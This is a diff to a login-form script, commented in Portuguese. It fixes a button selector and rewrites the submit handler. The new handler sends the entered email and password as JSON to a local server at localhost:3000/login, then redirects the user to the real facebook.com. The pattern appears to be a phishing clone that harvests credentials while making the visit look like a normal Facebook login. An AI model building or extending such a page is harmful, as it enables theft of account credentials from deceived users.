@@ -2,8 +2,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const loginForm = document.querySelector('.login-form');
     const emailInput = loginForm.querySelector('input[type="text"]');
     const senhaInput = loginForm.querySelector('input[type="password"]');
-    const btnEntrar = loginForm.querySelector('btn-entrar');
+    const btnEntrar = loginForm.querySelector('.btn-entrar');
     
+    // Verifica se o botão existe
+    if (!btnEntrar) {
+        console.error('Botão de entrar não encontrado! Verifique se a classe .btn-entrar está correta.');
+        return;
+    }
+
     // Desabilita o botão inicialmente
     btnEntrar.disabled = true;
     btnEntrar.style.opacity = '0.6';
@@ -31,8 +37,40 @@ document.addEventListener('DOMContentLoaded', () => {
     senhaInput.addEventListener('input', verificarCampos);
 
     // Manipula o envio do formulário
-    loginForm.addEventListener('submit', (e) => {
+    loginForm.addEventListener('submit', async (e) => {
         e.preventDefault();
-        window.location.href = 'https://www.facebook.com';
+        
+        // Verifica novamente se o botão está habilitado antes de enviar
+        if (!btnEntrar.disabled) {
+            try {
+                btnEntrar.textContent = 'Entrando...';
+                btnEntrar.disabled = true;
+
+                // Envia os dados para a API
+                const response = await fetch('http://localhost:3000/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: emailInput.value.trim(),
+                        senha: senhaInput.value.trim()
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    window.location.href = 'https://www.facebook.com';
+                } else {
+                    throw new Error(data.message || 'Erro ao fazer login');
+                }
+
+            } catch (error) {
+                console.error('Erro ao processar login:', error);
+                btnEntrar.textContent = 'Entrar';
+                btnEntrar.disabled = false;
+            }
+        }
     });
 });
